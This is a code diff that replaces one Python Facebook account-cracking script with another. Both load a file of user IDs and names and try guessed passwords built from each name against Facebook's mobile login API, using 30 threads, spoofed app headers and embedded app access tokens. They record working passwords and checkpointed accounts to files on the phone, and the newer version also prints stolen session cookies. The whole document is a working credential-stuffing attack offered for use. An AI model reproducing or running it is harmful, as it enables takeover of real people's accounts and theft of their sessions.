@@ -1,149 +1,383 @@
-#self code by flame 
-import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess
-from concurrent.futures import ThreadPoolExecutor
-from requests.exceptions import ConnectionError
+#Coded by HANNAN . Modified by SIAM AHMED 
 
-P = '\x1b[1;97m' # 
-M = '\x1b[1;91m' # 
-H = '\x1b[1;92m' # 
-K = '\x1b[1;93m' # 
-N = '\x1b[0m'    # 
+import os,time,random,re,sys,string, subprocess
 
-ugen = []
-for t in range(10000):
-	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
-	b=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
-	c=random.randrange(111111,210000)
-	d=random.randrange(73,100)
-	e=random.randrange(4200,4900)
-	f=random.randrange(40,150)
-	random1=random.choice(['SM-J730F','SM-A405FN','SM-J610FN','SM-X11O','SM-Q130A'])
-	flame1=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{d}.0.{e}.{f} Mobile Safari/537.36'
-	flame2=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{d}.0.{e}.{f} Mobile Safari/537.36 OPR/60.0.2254.59405'
-	uaku2 = random.choice([flame1,flame2])
-	ugen.append(uaku2)
+from concurrent.futures import ThreadPoolExecutor as tpe
+
+
+
+try:
+
+ import time,json,uuid,requests
+
+except:
+
+ os.system("pip install requests")
+
+
+
+idss = []
+
+pp = []
+
+oku = []
+
+cpu = []
+
+l = []
+
+idx = []
+
+loop = 0
+
+
+
+def oo(t):
+
+  return '\033[1;37m['+str(t)+']\033[1;37m '
+
+
+
+W = '\x1b[1;97m'
+
+G = '\x1b[1;92m'
+
+R = '\x1b[1;91m'
+
+S = '\x1b[1;96m'
+
+B = '\x1b[1;94m'
+
+Y = '\x1b[1;93m'
+
+P = '\x1b[1;95m'
+
+
+
+logo=(f"""\u001b[1;96m
+
+╔═╗╦╦  ╔═╗  ╔═╗╦═╗╔═╗╔═╗╦╔═
+
+╠╣ ║║  ║╣   ║  ╠╦╝╠═╣║  ╠╩╗
+
+╚  ╩╩═╝╚═╝  ╚═╝╩╚═╩ ╩╚═╝╩ ╩
+
+\u001b[0;1m
+
+Coded by Abdul Hannan Ansari
+
+Modified by SIAM AHMED
+
+""")
+
+
+
+def clear():
+
+   os.system('clear')
+
+   print(logo);lin3()
+
+
+
+def lin3():
+
+   print('\33[1;37m---------------------------------')
+
+def exit():
+
+  sys.exit()
+
+
+
+def main_menu():
+
+    os.system("clear")
+
+    print(logo);lin3()
+
+    print(f"{oo(1)}File Cloning ")   
+
+    print(f"{oo(0)}Exit")
+
+    lin3()
+
+    cp =input('[?] Choice : ')
+
+    if cp=="1":file()
+
+    if cp == "0":
+
+     exit()
+
+    main_menu()
+
      
-class crackfile:
-      
-      def __init__(self):
-            self.loop,self.ugen,self.ok,self.cp,self.id1,self.id2 = 0,[],[],[],[],[]
-            self.ses = requests.Session()
-            self.file()
-            
-      def Fx(self):
-            if "linux" in sys.platform.lower():
-                  try:os.system('clear')
-                  except:pass
-                  
-      def api(self,username,passz):
-            haha = str(random.choice([M, K, H]))
-            sys.stdout.write(f"\r{haha}[ XOD ] {P}{self.loop}|{len(self.id2)} {H}{len(self.ok)} {P}| {K}{len(self.cp)}{N}");sys.stdout.flush()
-            for password in passz:
-                  try:
-                        ua=random.choice(ugen)
-                        flame = "[FBAN/FB4A;FBAV/307.0.0.53.7;FBBV/354336875;FBDM/{density=2.0,width=720,height=1384};FBLC/en_GB;FBRV/0;FBCR/AIRTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-G930F;FBSV/6.0;FBOP/12;FBCA/armeabi-v7a:armeabi;]"
-                        head = {'Host':'graph.facebook.com','x-fb-connection-bandwidth': repr(random.randint(2e7, 3e7)), 'x-fb-sim-hni': repr(random.randint(2e4, 4e4)), 'x-fb-net-hni': repr(random.randint(2e4, 4e4)),'x-fb-connection-quality': 'EXCELLENT','user-agent': flame,'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
-                        date = {'access_token': '200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',  'format': 'JSON', 'sdk_version': {random.randrange(2, 31)}, 'email': username, 'locale': 'en_GB', 'password': password, 'sdk': 'android', 'generate_session_cookies': '1', 'sig': f'{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}'}   
-                        flx = self.ses.post("https://graph.facebook.com/auth/login", params=date, headers=head, allow_redirects=False).json()
-                        if "session_key" in flx: 
-                              coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                              print(f'\r{H}[OK] {username} | {password} | {coki}')
-                             
-                              open('/sdcard/ok.txt','a').write(f'{username}|{password}\n')
-                              self.ok.append(username)
-                              break
-                        elif "www.facebook.com" in flx["error"]["message"]:
-                              print(f'\r{K}[CP] {username} | {password}')
-                              open('/sdcard/cp.txt','a').write(f'{username}|{password}\n')
-                              self.cp.append(username)
-                              break
-                        elif "Calls to this api have exceeded the rate limit. (613)" in flx:sys.stdout.write(f"\r{M}[SPAM] {P}{self.loop}|{len(self.id2)} {H}OK : {len(self.ok)} {K}CP : {len(self.cp)}");sys.stdout.flush()
-                        else:continue	
-                  except requests.exceptions.ConnectionError: time.sleep(35)
-            self.loop+=1
-            
-      def listpw(self):
-            self.intel()
-            with ThreadPoolExecutor(max_workers=30) as flame:
-                  for idf in self.id2:
-                        uid,user = idf.split('|')[0], idf.split('|')[1].lower()
-                        haha = user.split(' ')[0]
-                        if len(user) <=5:
-                               if len(haha) <=1 or len(haha) <=2:pass 
-                               else:
-                                     pwd=[
-                                         '57273200',
-                                         haha+'123', 
-                                         haha+'1234', 
-                                         haha+'@@@###', 
-                                         haha+'#####', 
-                                         haha+'@@##', 
-                                         haha+'@#@#', 
-                                         haha+'$$$', 
-                                         haha+'@', 
-                                         haha+'@123', 
-                                         haha+'@@', 
-                                         haha+'@@@', 
-                                         haha+'@@@@', 
-                                         haha+'@#', 
-                                         haha+'12345', 
-                                         haha+'123456',
-                                         haha+'01',haha+'02',
-                                         haha+'03',haha+'04',
-                                         haha+'05',haha+'06',
-                                         haha+'07',haha+'08',
-                                         haha+'09',haha+'10'
-                                    ]
-                        else:
-                              pwd=[
-                                  user, 
-                                  '57273200',
-                                  haha+'123', 
-                                  haha+'1234', 
-                                  haha+'@@@###', 
-                                  haha+'#####', 
-                                  haha+'@@##', 
-                                  haha+'@#@#',
-                                  haha+'$$$', 
-                                  haha+'@', 
-                                  haha+'@123', 
-                                  haha+'@@', 
-                                  haha+'@@@', 
-                                  haha+'@@@@', 
-                                  haha+'@#', 
-                                  haha+'12345', 
-                                  haha+'123456',
-                                  haha+'01',haha+'02',
-                                  haha+'03',haha+'04',
-                                  haha+'05',haha+'06',
-                                  haha+'07',haha+'08',
-                                  haha+'09',haha+'10'
-                             ]
-                        flame.submit(self.api,uid,pwd)
-            exit('\n<>  ')
-            
-      def file(self):
-            self.Fx()
-            
-            print(f"""    ██   ██  ██████  ██████  
-     ██ ██  ██    ██ ██   ██ 
-      ███   ██    ██ ██   ██ 
-     ██ ██  ██    ██ ██   ██ 
-    ██   ██  ██████  ██████    {H} XD {P}
-                                    """)
-            print(f'{N}--------------------------------------------')
-            file = input(f'{P}[{H}?{P}] YOUR FILE : {N}')
-            try:
-                 for line in open(file, 'r').readlines():
-                       self.id1.append(line.strip())
-            except IOError:
-                  exit(f'{N}[{M}×{N}] ERROR!')
-            for ih in self.id1:
-                  self.id2.insert(0, ih)
-            self.listpw()
-            
-      def intel(self):
-            print(f'{N}--------------------------------------------\nCLONE STARTED AROPLAIN MODE EVERY MINUTES')   
-            print(f'{N}--------------------------------------------')
-            
-crackfile()
+
+def file():
+
+    os.system("clear")
+
+    print(logo);lin3()
+
+    file = input(f"{oo('-')}Enter File: ")
+
+    try:
+
+        for x in open(file,'r').readlines():
+
+            idx.append(x.strip())
+
+    except:
+
+        print(f"{oo('!')}File Not Found");time.sleep(1)
+
+        main_menu() 
+
+    method()
+
+    exit()
+
+
+
+
+
+
+
+"""
+
+------Access Token------
+
+Access Tokens. Change if necessary.
+
+
+
+Ads Manager Android : 438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28
+
+Facebook Android : 350685531728|62f8ce9f74b12f84c123cc23437a4a32
+
+Facebook iPhone : 6628568379|c1e620fa708a1d5696fb991c1bde5662
+
+Ads Manager App for iOS : 1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae
+
+
+
+--------URL and Host--------
+
+Graph : https://graph.facebook.com/auth/login/
+
+B-Graph : https://b-graph.facebook.com/auth/login
+
+"""
+
+
+
+
+
+def method():
+
+    clear()
+
+    
+
+    lp = input(f'{oo("?")}Limit Passwords? : ')
+
+    if lp.isnumeric():
+
+        pp=[]
+
+        clear()
+
+        ex = 'firstlast first123 last123'
+
+        print(f'{oo("+")}{ex} (ETC)')
+
+        lin3()
+
+        for x in range(int(lp)):
+
+           pp.append(input(f'{oo(x+1)}Password : '))
+
+    else:
+
+       print(f"{oo('!')}Numeric Only");time.sleep(0.8)
+
+       main_menu()
+
+    clear() 
+
+    print('\033[1;97m[+] Total Accounts For CraCk : \033[1;32m '+str(len(idx)))
+
+    print(f'\x1b[1;97m[✓] Dont Use Airplane mOde ;)')
+
+    lin3()
+
+    def start(user):
+
+     try:
+
+        global loop,idx,cll
+
+        r = requests.Session()
+
+        user = user.strip()
+
+        acc, name = user.split("|")
+
+        first = name.rsplit(" ")[0]
+
+        try:
+
+            last = name.rsplit(" ")[1]
+
+        except:
+
+            last = first
+
+        pers = str(int(loop)/int(len(idx)) * 100)[:4]
+
+        sys.stdout.write(f'\r {R}[{W}HANNAN{R}] {P}({Y}{loop}{W} / {W}{len(idx)}{P}) {W}• {G}{len(oku)}\r')
+
+        sys.stdout.flush()
+
+        loop+=1
+
+        for pswd in pp:
+
+              heads="Dalvik/2.1.0 (Linux; U; Android 8.0.0; moto e5 plus Build/OPPS27.91-179-8-16) [FBAN/FB4A;FBAV/287.0.0.50.119;FBPN/com.facebook.katana;FBLC/es_MX;FBBV/243660864;FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;]" #Put Your user Agent Here
+
+              pswd = pswd.replace(f'first',first.lower()).replace(f'First',first).replace(f'last',last.lower()).replace(f'Last',last).replace(f'Name',name).replace(f'name',name.lower())
+
+              header = {
+
+    "Content-Type": "application/x-www-form-accencoded",
+
+    "Host": "graph.facebook.com",
+
+    "User-Agent": heads,
+
+    "X-FB-Net-HNI": "45204",
+
+    "X-FB-SIM-HNI": "45201",
+
+    "X-FB-Connection-Type": "unknown",
+
+    "X-Tigon-Is-Retry": "False",
+
+    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
+
+    "x-fb-device-group": "5120",
+
+    "X-FB-Friendly-Name": "ViewerReactionsMutation",
+
+    "X-FB-Request-Analytics-Tags": "graphservice",
+
+    "Accept-Encoding": "gzip, deflate",
+
+    "X-FB-HTTP-Engine": "Liger",
+
+    "X-FB-Client-IP": "True",
+
+    "X-FB-Server-Cluster": "True",
+
+    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
+
+    "Connection": "Keep-Alive",
+
+              }
+
+
+
+              data={
+
+    "adid": str(uuid.uuid4()),
+
+    "format": "json",
+
+    "device_id": str(uuid.uuid4()),
+
+    "cpl": "true",
+
+    "family_device_id": str(uuid.uuid4()),
+
+    "credentials_type": "device_based_login_password",
+
+    "error_detail_type": "button_with_disabled",
+
+    "source": "device_based_login",
+
+    "email": acc,
+
+    "password": pswd,
+
+    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+
+    "generate_session_cookies": "1",
+
+    "meta_inf_fbmeta": "",
+
+    "advertiser_id": str(uuid.uuid4()),
+
+    "currently_logged_in_userid": "0",
+
+    "locale": "en_US",
+
+    "client_country_code": "US",
+
+    "method": "auth.login",
+
+    "fb_api_req_friendly_name": "authenticate",
+
+    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+
+    "api_key": "882a8490361da98702bf97a021ddc14d",
+
+              }
+
+
+
+              response = r.post('https://graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False).text
+
+              if "session_key" in response:
+
+                 oku.append(acc)
+
+                 cookie=f"sb={''.join(random.choices(string.ascii_letters+string.digits+'_',k=24))};" +";".join(f"{i['name']}={i['value']}" for i in json.loads(response)["session_cookies"])
+
+                 print('\033[1;32m[OK] \033[1;32m'+acc+' \033[1;32m|\033[1;32m '+pswd)
+
+                 print(" [Cookie] ",cookie)
+
+                 open('/sdcard/Hannan-Ok.txt','a').write(f'{acc}|{pswd}\n')
+
+                 break
+
+              elif "User must verify their account" in response:
+
+                cpu.append(acc)
+
+                print('\033[1;31m[CP] \033[1;31m'+acc+' \033[1;31m|\033[1;31m '+pswd)
+
+                open('/sdcard/Hannan-CP.txt','a').write(f'{acc}|{pswd}\n')
+
+                break
+
+              else:
+
+                   continue   
+
+     except Exception as e:
+
+       time.sleep(10)
+
+    with tpe(max_workers=30) as tp:
+
+            tp.map(start,idx)
+
+    exit()    
+
+
+
+
+
+main_menu()
